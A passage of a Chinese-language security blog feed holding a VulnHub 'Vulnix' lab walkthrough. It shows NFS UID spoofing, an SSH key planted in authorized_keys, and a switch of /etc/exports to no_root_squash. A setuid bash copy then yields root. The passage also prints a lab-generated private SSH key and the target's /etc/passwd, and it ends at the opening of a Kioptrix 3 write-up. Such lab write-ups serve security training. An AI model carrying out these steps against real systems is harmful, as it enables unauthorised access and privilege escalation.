groups=1000(user),100(users)</span><br><span class="line">user@vulnix:~$ whoami</span><br><span class="line">user</span><br><span class="line">user@vulnix:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/user</span><br><span class="line">user@vulnix:~$ uname -a</span><br><span class="line">Linux vulnix 3.2.0-29-generic-pae <span class="comment">#46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>当然，该用户不是sudoer。</p>
<h3 id="ssh-key毒化以getshell"><a href="#ssh-key毒化以getshell" class="headerlink" title="ssh key毒化以getshell"></a>ssh key毒化以getshell</h3><p>不得已时尝试以vulnix用户身份登录。</p>
<p>检查受害服务器上的/etc/passwd文件，发现用户vulnix具有UID 2008，因此在本地计算机上创建了一个名为vulnix的用户，UID为2008，然后尝试再次访问该分区：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user@vulnix:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:102:105::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">whoopsie:x:103:106::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">postfix:x:104:110::/var/spool/postfix:/bin/<span class="literal">false</span></span><br><span class="line">dovecot:x:105:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/<span class="literal">false</span></span><br><span class="line">dovenull:x:106:65534:Dovecot login user,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">landscape:x:107:113::/var/lib/landscape:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">user:x:1000:1000:user,,,:/home/user:/bin/bash</span><br><span class="line">vulnix:x:2008:2008::/home/vulnix:/bin/bash</span><br><span class="line">statd:x:109:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>使用新创建的vulnix用户（具有UID 2008权限）成功进入已经挂载的/mnt/vulnix文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># useradd vulnix</span></span><br><span class="line">root@kali:~<span class="comment"># passwd vulnix</span></span><br><span class="line">新的 密码：</span><br><span class="line">重新输入新的 密码：</span><br><span class="line">passwd：已成功更新密码</span><br><span class="line">root@kali:~<span class="comment"># leafpad /etc/passwd</span></span><br><span class="line">root@kali:~<span class="comment"># su vulnix</span></span><br><span class="line">$ ls</span><br><span class="line">android-backup-recover.jar  ctf               go                  Linux_Exploit_Suggester.pl  proxychains-ng  TheFatRat</span><br><span class="line">ant                         Desktop           gobackdoor          linuxprivchecker.py         pwndbg          translatefiles</span><br><span class="line">antshells                   dirmap            gobackdoor.go       linux-sendpage3             pycdc           trojan</span><br><span class="line">antsword                    dirsearch         HiddenEye           location                    safedog2.py     uncompyle2</span><br><span class="line">BlindWaterMark              Downloads         historyvulnhub      Lucifer113.ovpn             safedog.py      vulnhub</span><br><span class="line">burpextend                  dvcs-ripper       hsdecomp            lxd-alpine-builder          shells          WAFNinja</span><br><span class="line">cansina                     Fatrat_Generated  knock-knock-master  picture                     SocialFish</span><br><span class="line">checkifbase64.py            GitHack           LinEnum.sh          pkcrack                     struts-pwn</span><br><span class="line">$ id</span><br><span class="line">uid=2008(vulnix) gid=2008 组=2008</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line">$ <span class="built_in">cd</span> /mnt/vulnix</span><br><span class="line">$ ls</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/mnt/vulnix</span><br><span class="line">$ whoami</span><br><span class="line">vulnix</span><br><span class="line">$ id</span><br><span class="line">uid=2008(vulnix) gid=2008 组=2008</span><br><span class="line">$ ls -la</span><br><span class="line">总用量 20</span><br><span class="line">drwxr-x--- 2 nobody 4294967294 4096 9月   2  2012 .</span><br><span class="line">drwxr-xr-x 3 root   root       4096 4月  15 23:00 ..</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294  220 4月   3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294 3486 4月   3  2012 .bashrc</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294  675 4月   3  2012 .profile</span><br></pre></td></tr></table></figure>

<p>已经进入，生成一个SSH密钥，以vulnix用户身份登录而不需要密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># ssh-keygen -t rsa</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/root/.ssh/id_rsa): /root/vulnhub/vulnix/id_rsa</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /root/vulnhub/vulnix/id_rsa</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /root/vulnhub/vulnix/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:spDzqP71ppmCK9Ls2eSA+m1TFlI8Rs5xptB4isWBn7M root@kali</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 3072]----+</span></span><br><span class="line"><span class="string">|   oo*o o        |</span></span><br><span class="line"><span class="string">|  . ++B=         |</span></span><br><span class="line"><span class="string">|   + *+.         |</span></span><br><span class="line"><span class="string">|  . *..          |</span></span><br><span class="line"><span class="string">|    ++..S        |</span></span><br><span class="line"><span class="string">| .  E=oo         |</span></span><br><span class="line"><span class="string">|.o..oo+          |</span></span><br><span class="line"><span class="string">|+ +O+. +.        |</span></span><br><span class="line"><span class="string">|o=B+=o+o.        |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# ls</span></span><br><span class="line"><span class="string">id_rsa  id_rsa.pub  user.txt</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# cat id_rsa</span></span><br><span class="line"><span class="string">-----BEGIN OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span></span><br><span class="line"><span class="string">NhAAAAAwEAAQAAAYEA3rZnUKi375a1jnBNaY1apRRslsyf+YG8mMrGKcnEwDGEXcKaeyna</span></span><br><span class="line"><span class="string">zdXsBDPf/0V2kQA9XYPBG+Q/ppc6hl4BpmDi+SbEDH5KSX2SPyON1qeYAAu9kfwSx8HOxW</span></span><br><span class="line"><span class="string">SPUYePPCOnuqxcBA2iIISsmSq10QR7mMSiADqpGFjM0C/22NhLbdEX4WSsJPbOJVhJFLn9</span></span><br><span class="line"><span class="string">VCtVGpLC/g3Cu3CYJ5EtuAfvAYcwvgjJjW0Rb7Euv7nsBaTVfcFWkCfPzFgXGzdhnLORLP</span></span><br><span class="line"><span class="string">Ig29l0NrHkxTbh0cfNpcUrSRO8xSUUF8ACMxObbuVcjzbpXX8rrTaxemE89vFVG6zLRxEX</span></span><br><span class="line"><span class="string">0Fk21EHc/CMfYj7RrHYUek689KaKKGfS/X5dNQIwJ0kfR/zkz5L1WrkemrM+wJPamxeckL</span></span><br><span class="line"><span class="string">DEGVTdg1HmIOwVsFpKV/QiAQijPnCQfa1f2buQxOOSla2rD80bGYIPlJ2/ZdYR/GizM+6Q</span></span><br><span class="line"><span class="string">Er+XcCTzWYDsKT2NYO+ZVCROgxTR2CyLuY4Hb+M7AAAFgHbM1252zNduAAAAB3NzaC1yc2</span></span><br><span class="line"><span class="string">EAAAGBAN62Z1Cot++WtY5wTWmNWqUUbJbMn/mBvJjKxinJxMAxhF3Cmnsp2s3V7AQz3/9F</span></span><br><span class="line"><span class="string">dpEAPV2DwRvkP6aXOoZeAaZg4vkmxAx+Skl9kj8jjdanmAALvZH8EsfBzsVkj1GHjzwjp7</span></span><br><span class="line"><span class="string">qsXAQNoiCErJkqtdEEe5jEogA6qRhYzNAv9tjYS23RF+FkrCT2ziVYSRS5/VQrVRqSwv4N</span></span><br><span class="line"><span class="string">wrtwmCeRLbgH7wGHML4IyY1tEW+xLr+57AWk1X3BVpAnz8xYFxs3YZyzkSzyINvZdDax5M</span></span><br><span class="line"><span class="string">U24dHHzaXFK0kTvMUlFBfAAjMTm27lXI826V1/K602sXphPPbxVRusy0cRF9BZNtRB3Pwj</span></span><br><span class="line"><span class="string">H2I+0ax2FHpOvPSmiihn0v1+XTUCMCdJH0f85M+S9Vq5HpqzPsCT2psXnJCwxBlU3YNR5i</span></span><br><span class="line"><span class="string">DsFbBaSlf0IgEIoz5wkH2tX9m7kMTjkpWtqw/NGxmCD5Sdv2XWEfxoszPukBK/l3Ak81mA</span></span><br><span class="line"><span class="string">7Ck9jWDvmVQkToMU0dgsi7mOB2/jOwAAAAMBAAEAAAGAQTkYDrYqj/8KErnu4d+k0T2nA4</span></span><br><span class="line"><span class="string">7Ptul4yyJvYGOXvFWEF1VbmoBKdQeWRDDRA9ha/eIdFpr0Xe+9eFNHr3wubYRoVGE2/xWp</span></span><br><span class="line"><span class="string">OdaNkvIdouSYDkNh9DPnaBrpLEPj+RODLjCe+Xtqw0Ee3vkb9wtcDeeLLtU/QGPti5TN/p</span></span><br><span class="line"><span class="string">Zda2oExRd8L+UkyPqCqsstM+W4PAMovEyI0JBFHFHALa5FvmSMaV0nODAonsN3XMd+EmYn</span></span><br><span class="line"><span class="string">qgt4/og1iqguIgEWW0EfSDbAFeDKWdFWPYuGcW+JAS7rwOMycJtofY0y6zb459HA/j6x2Z</span></span><br><span class="line"><span class="string">Gk/vWfi7NPjJTncm5EkN7PIUWljhjwuOGSwnr5QRXomU61Us3L+nljFybF3hsLSKXK/9tV</span></span><br><span class="line"><span class="string">q2VuoAPbHInVOsGAwiFMdKQAlizCNw9RkPAASSopE9LZDxZXaSz2knPX43n/yH0fTs2jMG</span></span><br><span class="line"><span class="string">VUunGXRbzbP1sNGWlrq53F1zdDFhKw2RsnwnEJqTxey1RHgNxfQ9Idkr7seqSEHpGpAAAA</span></span><br><span class="line"><span class="string">wQDzzeeHsiAXeYWVjkI8dM6Vvm7dNOvvpwm+lYkRNh8tNfBw2tGzSC5Djx0ADLZxDryhoL</span></span><br><span class="line"><span class="string">osnG4dQeSeASV3gK0qRDHJgIxJyoaLNc3udOjZ+PQuTtSHWb5Ng6NxvqghTrQepab5IgtE</span></span><br><span class="line"><span class="string">qaOkquhIr4sq0FwuHfJmbDqcIqcEc7qsfdxdKnf7+E1ii1APVl9BUNODzaJmI1kUnv12YR</span></span><br><span class="line"><span class="string">cx+OYi5qbih4O6BCVkUMqYn9nIVOfwwY+ndonxV+OyOxj5tDIAAADBAPT9intj92Pnrm0c</span></span><br><span class="line"><span class="string">ZIPUdAD68FGp9jL+ca6CTnjp/7cRrlBBCd2SUoS34Demerk2q3g0xFBlfcheUpzdPr7Wh0</span></span><br><span class="line"><span class="string">bANVoeKOztj1Z5bVrICJB3kNvhpHZQ6BdscTgiWeFHBQ8OW1z4q1umPOVnX0/PH2eEHS7s</span></span><br><span class="line"><span class="string">lDkoBPU9fuj01ZQg8hHO1xb54a7Gg9paqVvfHQnvZz9Jw3z/+B9GQK8uL2UfwrTuErarGz</span></span><br><span class="line"><span class="string">kEjeOeX/Q6OC+y+2YyBsGxmdKeeByKtwAAAMEA6LiR2x5pWbKTUTklwZrX+mPGFSaRMGow</span></span><br><span class="line"><span class="string">i8M+gykhualFDvXYRb5gtluRmbmgKvIKaijYWgTWpod2p+ghg7V5KSby/oWbWo8dM7DVeR</span></span><br><span class="line"><span class="string">DPdGhJ2xFRqHhVBJ0MugjMnZFE11UAS6hPFLYl5L1Ow54pAw0f/OBVzEGuZuVnF1i84tzx</span></span><br><span class="line"><span class="string">4r70/fHHXH8d6PYtehcL1O/wjNfjkkHONI/GxwAZzzF5Yn1h1aIB4X4B6iXkj+TJIAQcHe</span></span><br><span class="line"><span class="string">vU05iNf3ixaredAAAACXJvb3RAa2FsaQE=</span></span><br><span class="line"><span class="string">-----END OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# cat id_rsa.pub </span></span><br><span class="line"><span class="string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDetmdQqLfvlrWOcE1pjVqlFGyWzJ/5gbyYysYpycTAMYRdwpp7KdrN1ewEM9//RXaRAD1dg8Eb5D+mlzqGXgGmYOL5JsQMfkpJfZI/I43Wp5gAC72R/BLHwc7FZI9Rh488I6e6rFwEDaIghKyZKrXRBHuYxKIAOqkYWMzQL/bY2Ett0RfhZKwk9s4lWEkUuf1UK1UaksL+DcK7cJgnkS24B+8BhzC+CMmNbRFvsS6/uewFpNV9wVaQJ8/MWBcbN2Gcs5Es8iDb2XQ2seTFNuHRx82lxStJE7zFJRQXwAIzE5tu5VyPNuldfyutNrF6YTz28VUbrMtHERfQWTbUQdz8Ix9iPtGsdhR6Trz0poooZ9L9fl01AjAnSR9H/OTPkvVauR6asz7Ak9qbF5yQsMQZVN2DUeYg7BWwWkpX9CIBCKM+cJB9rV/Zu5DE45KVrasPzRsZgg+Unb9l1hH8aLMz7pASv5dwJPNZgOwpPY1g75lUJE6DFNHYLIu5jgdv4zs= root@kali</span></span><br></pre></td></tr></table></figure>

<p>然后在终端上以’vulnix’用户身份将生成的ssh-key复制到’/home/vulnix/.ssh/authorized_keys’文件中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir .ssh</span><br><span class="line">$ <span class="built_in">cd</span> .ssh</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/mnt/vulnix/.ssh</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDetmdQqLfvlrWOcE1pjVqlFGyWzJ/5gbyYysYpycTAMYRdwpp7KdrN1ewEM9//RXaRAD1dg8Eb5D+mlzqGXgGmYOL5JsQMfkpJfZI/I43Wp5gAC72R/BLHwc7FZI9Rh488I6e6rFwEDaIghKyZKrXRBHuYxKIAOqkYWMzQL/bY2Ett0RfhZKwk9s4lWEkUuf1UK1UaksL+DcK7cJgnkS24B+8BhzC+CMmNbRFvsS6/uewFpNV9wVaQJ8/MWBcbN2Gcs5Es8iDb2XQ2seTFNuHRx82lxStJE7zFJRQXwAIzE5tu5VyPNuldfyutNrF6YTz28VUbrMtHERfQWTbUQdz8Ix9iPtGsdhR6Trz0poooZ9L9fl01AjAnSR9H/OTPkvVauR6asz7Ak9qbF5yQsMQZVN2DUeYg7BWwWkpX9CIBCKM+cJB9rV/Zu5DE45KVrasPzRsZgg+Unb9l1hH8aLMz7pASv5dwJPNZgOwpPY1g75lUJE6DFNHYLIu5jgdv4zs= root@kali&quot;</span> &gt; authorized_keys</span><br><span class="line">$ ls</span><br><span class="line">authorized_keys</span><br></pre></td></tr></table></figure>

<p>然后使用ssh私匙登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># ssh vulnix@192.168.66.18 -i id_rsa</span></span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Apr 16 04:23:19 BST 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           92</span><br><span class="line">  Usage of /:   90.2% of 773MB   Users logged <span class="keyword">in</span>:     1</span><br><span class="line">  Memory usage: 9%               IP address <span class="keyword">for</span> eth0: 192.168.66.18</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.2% of 773MB</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">New release <span class="string">&#x27;14.04.6 LTS&#x27;</span> available.</span><br><span class="line">Run <span class="string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">vulnix@vulnix:~$ id</span><br><span class="line">uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)</span><br><span class="line">vulnix@vulnix:~$ whoami</span><br><span class="line">vulnix</span><br><span class="line">vulnix@vulnix:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/vulnix</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ sudo -l</span><br><span class="line">Matching <span class="string">&#x27;Defaults&#x27;</span> entries <span class="keyword">for</span> vulnix on this host:</span><br><span class="line">    env_reset, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User vulnix may run the following commands on this host:</span><br><span class="line">    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span><br></pre></td></tr></table></figure>

<p>很好,vulnix可以运行命令来打开/etc/exports，不用输入密码。这是发现的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ sudoedit /etc/exports</span><br><span class="line"><span class="comment"># /etc/exports: the access control list for filesystems which may be exported</span></span><br><span class="line"><span class="comment">#               to NFS clients.  See exports(5).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv2 and NFSv3:</span></span><br><span class="line"><span class="comment"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv4:</span></span><br><span class="line"><span class="comment"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span></span><br><span class="line"><span class="comment"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">/home/vulnix    *(rw,root_squash)</span><br></pre></td></tr></table></figure>

<p>还记得之前说过的有关Root squashing的内容吗？（感谢课程，Owen xD）</p>
<p>用no_root_squash替换了root_squash flag。需要作弊，因为没有vulnix的密码，而且没有sudo用户执行命令/usr/sbin/exportfs -a或计算机重新引导，就无法再次导出NFS分区，所以手动重新引导（Boooooo，真是个n0o0o0o0ob !!）</p>
<ul>
<li>root_squash： 客户端的root用户映射到任何人：客户端无法使用setuid位将恶意软件留给他人执行。</li>
<li>no_root_squash：通过此选项，停用了此安全功能，从而允许客户端的root权限操作最终以root身份出现在导出的文件系统中（因此，在其余客户端中）。</li>
</ul>
<p>机器重新启动后，再次安装该分区并以本地root用户身份访问。</p>
<p>检查机器是否再次启动（再次抱歉！）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ping -c 4 192.168.66.18</span></span><br><span class="line">PING 192.168.66.18 (192.168.66.18) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=1 ttl=64 time=1.04 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=2 ttl=64 time=0.279 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=3 ttl=64 time=0.482 ms</span><br><span class="line">64 bytes from 192.168.66.18: icmp_seq=4 ttl=64 time=0.492 ms</span><br><span class="line"></span><br><span class="line">--- 192.168.66.18 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 3033ms</span><br><span class="line">rtt min/avg/max/mdev = 0.279/0.572/1.037/0.281 ms</span><br></pre></td></tr></table></figure>

<p>然后再次挂载分区：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># mount 192.168.66.18:/home/vulnix /mnt/vulnix</span></span><br><span class="line">root@kali:~<span class="comment"># cd /mnt/vulnix</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls</span></span><br><span class="line">local_shell</span><br></pre></td></tr></table></figure>

<p>挂载后，获得了受害者计算机本地shell的副本，并将所有权和SID更改为root：</p>
<p>在受害者的机器上，如“vulnix”：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ cp /bin/bash local_shell</span><br><span class="line">vulnix@vulnix:~$ ls</span><br><span class="line">local_shell</span><br></pre></td></tr></table></figure>

<p>在本地计算机上，以<code>root</code>身份：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/mnt/vulnix<span class="comment"># cat local_shell &gt; spawn_root_shell</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls</span></span><br><span class="line">local_shell  spawn_root_shell</span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># chmod 4777 *</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls -la</span></span><br><span class="line">总用量 1828</span><br><span class="line">drwxr-x--- 4 vulnix vulnix   4096 4月  16 02:33 .</span><br><span class="line">drwxr-xr-x 3 root   root     4096 4月  15 23:00 ..</span><br><span class="line">-rw------- 1 vulnix vulnix      0 4月  16 02:27 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    220 4月   3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix   3486 4月   3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix   4096 4月  15 23:23 .cache</span><br><span class="line">-rwsrwxrwx 1 vulnix vulnix 920788 4月  16 02:24 local_shell</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    675 4月   3  2012 .profile</span><br><span class="line">-rwsrwxrwx 1 root   root   920788 4月  16 02:33 spawn_root_shell</span><br><span class="line">drwxr-xr-x 2 vulnix vulnix   4096 4月  15 23:21 .ssh</span><br></pre></td></tr></table></figure>

<p>然后在受害人的机器上执行shell，并保留带有flag -p的原始文件的权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vulnix@vulnix:~$ ls -la</span><br><span class="line">total 1828</span><br><span class="line">drwxr-x--- 4 vulnix vulnix   4096 Apr 16 07:33 .</span><br><span class="line">drwxr-xr-x 4 root   root     4096 Sep  2  2012 ..</span><br><span class="line">-rw------- 1 vulnix vulnix      0 Apr 16 07:27 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    220 Apr  3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix   3486 Apr  3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix   4096 Apr 16 04:23 .cache</span><br><span class="line">-rwsrwxrwx 1 vulnix vulnix 920788 Apr 16 07:24 local_shell</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    675 Apr  3  2012 .profile</span><br><span class="line">-rwsrwxrwx 1 root   root   920788 Apr 16 07:33 spawn_root_shell</span><br><span class="line">drwxr-xr-x 2 vulnix vulnix   4096 Apr 16 04:21 .ssh</span><br><span class="line">vulnix@vulnix:~$ ./spawn_root_shell -p</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># id</span></span><br><span class="line">uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># cd /root</span></span><br><span class="line">spawn_root_shell-4.2<span class="comment"># ls</span></span><br><span class="line">trophy.txt</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># cat trophy.txt</span></span><br><span class="line">cc614640424f5bd60ce5d5264899c3be</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub257.jpg"></li>
</ul>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>通过telnet连接收集用户名敏感信息</li>
<li>finger查看用户登录信息</li>
<li>使用rpcinfo进行RPC枚举</li>
<li>使用showmount进行NFS枚举</li>
<li>hydra爆破ssh密码</li>
<li>ssh key毒化攻击getshell</li>
<li>特定linux UID权限用户登录挂载的NFS分区</li>
<li>使用ssh私匙登录ssh</li>
<li>用no_root_squash替换root_squash以停用安全功能，从而允许客户端的root权限操作最终使文件以root身份出现在导出的文件系统中（在其余客户端中）</li>
<li>客户端本地以root身份运行cat命令拷贝shell文件，并chmod 4777赋予权限，最后执行shell文件加上-p参数提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[KVM3]</title>
    <url>/2019/12/13/KVM3/</url>
    <content><![CDATA[<p>名称：Kioptrix: Level 1.2 (#3)<br>发行日期：2011年4月18日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5raW9wdHJpeC5jb20vZGx2bS9LVk0zLnJhcg==">http://www.kioptrix.com/dlvm/KVM3.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LVk0zLnJhcg==">https://download.vulnhub.com/kioptrix/KVM3.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LVk0zLnJhci50b3JyZW50">https://download.vulnhub.com/kioptrix/KVM3.rar.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>自上次Kioptrix VM挑战以来已经过去了一段时间。生活不断让您知道这些事情。<br>在看到最后两个的下载数量之后，以及无数的视频中展示了克服这些挑战的方法。我觉得需要1.2（或者只是3级）。感谢您下载并播放了前两个版本。还要感谢那些花时间为他们制作视频解决方案的人。不胜感激。<br>与其他两个一样，这一挑战也面向初学者。但是，这是不同的。增加了一些步骤，并且需要新的技能。我仍然必须成为初学者的领域。与其他方法一样，“pown”此方法的方法不止一种。很简单，而不是那么简单。记住……“轻松”或“困难”的感觉总是与自己的技能水平相关的。我从未说过这些事情异常困难或困难，但我们都需要从某个地方入手。让我告诉你，制作这些易受攻击的VM并不像看起来那么容易…<br>这个挑战很重要。一旦找到IP（DHCP客户端），请编辑主机文件并将其指向kioptrix3.com。<br>在Windows下，您可以编辑C：\Windows\System32\drivers\etc\hosts，如下所示：</p>
<a id="more"></a>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># localhost name resolution is handled within DNS itself.</span></span><br><span class="line"><span class="comment">#   127.0.0.1 localhost</span></span><br><span class="line"><span class="comment">#   ::1 localhost127.0.0.1 static3.cdn.ubi.com</span></span><br><span class="line">192.168.1.102 kioptrix3.com</span><br></pre></td></tr></table></figure>
<p>在Linux下，将是/etc/hosts<br>这里涉及一个网络应用程序，因此要使所有内容都很好并正确显示，您确实需要这样做。<br>希望您喜欢Kioptrix VM Level 1.2挑战。<br>Have fun</p>
<p>漏洞：</p>
<ul>
<li>文件包含</li>
<li>访问控制不当</li>
<li>重用凭证</li>
<li>SQL注入</li>
<li>不受限制地上传危险类型的文件</li>
<li>凭证不足</li>
</ul>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
